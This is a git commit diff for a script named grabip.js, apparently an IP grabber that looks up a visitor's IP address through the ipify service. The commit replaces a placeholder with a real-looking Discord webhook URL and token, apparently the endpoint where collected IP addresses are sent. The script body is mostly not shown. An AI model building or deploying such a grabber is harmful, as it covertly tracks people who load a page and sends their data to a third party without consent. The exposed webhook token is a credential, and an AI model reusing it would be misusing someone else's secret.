87d974100767bd56bc9bdd7ceeb3fd3cc5876438
Landinghits <hasnipleo@gmail.com>
2025-01-22 00:42:44 +0000

    Update grabip.js

--- grabip.js
+++ grabip.js
@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1331423533649231994/Jpcxq6mMWCmT5LeSaWvzLRRTwU_cLAumOUHbSv1Xo4IAvWuKkTuzJbkTXEOpnhrUJYqc";
 
 
 async function getIP() {
